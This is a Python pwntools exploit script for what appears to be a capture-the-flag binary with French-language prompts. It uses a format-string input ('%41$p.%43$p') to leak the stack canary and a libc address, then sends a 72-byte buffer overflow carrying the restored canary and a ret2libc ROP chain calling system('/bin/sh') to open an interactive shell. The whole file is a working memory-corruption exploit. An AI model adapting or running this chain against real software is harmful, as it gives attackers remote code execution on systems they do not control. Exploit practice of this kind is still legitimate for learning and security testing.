#!/usr/bin/env python3
from pwn import *
import re

context.terminal = ['alacritty', '-e', 'bash', '-c']

exe  = ELF("./chall")
libc = ELF("./libc.so.6")
context.binary = exe
context.arch   = "amd64"

HOST = "addr"
PORT = 1337

GDB_SCRIPT = """
b vuln
b *vuln+113
b exit
c
"""

def conn():
    if args.LOCAL:
        r = process(exe.path)

        if args.GDB or args.DEBUG:
            pause()
            gdb.attach(r, gdbscript=GDB_SCRIPT, api=False)

        return r

    return remote(HOST, PORT)


offset = 72

def main():
    r = conn()

    r.recvuntil(b"Entrez votre payload :\n")

    r.sendline(b"%41$p.%43$p")

    line = r.recvline()
    leaks = [int(x,16) for x in re.findall(b"0x[0-9a-fA-F]+", line)]

    canary    = leaks[0]
    libc_leak = leaks[1]
    libc_base = libc_leak - 0x276e9

    log.success(f"canary    = {hex(canary)}")
    log.success(f"libc_leak = {hex(libc_leak)}")
    log.success(f"libc_base = {hex(libc_base)}")

    libc.address = libc_base

    rop_libc = ROP(libc)
    pop_rdi = rop_libc.find_gadget(['pop rdi','ret']).address
    ret     = rop_libc.find_gadget(['ret']).address

    system = libc.sym["system"]
    binsh  = next(libc.search(b"/bin/sh"))

    log.success(f"pop_rdi = {hex(pop_rdi)}")
    log.success(f"ret     = {hex(ret)}")
    log.success(f"system  = {hex(system)}")
    log.success(f"/bin/sh = {hex(binsh)}")

    r.recvuntil(b"Entrez votre ROP :\n")

    payload = flat(
        b"A"*offset,   
        canary,        
        b"B"*8,        
        ret,        
        pop_rdi,
        binsh,
        system
    )

    r.sendline(payload)
    r.interactive()


if __name__ == "__main__":
    main()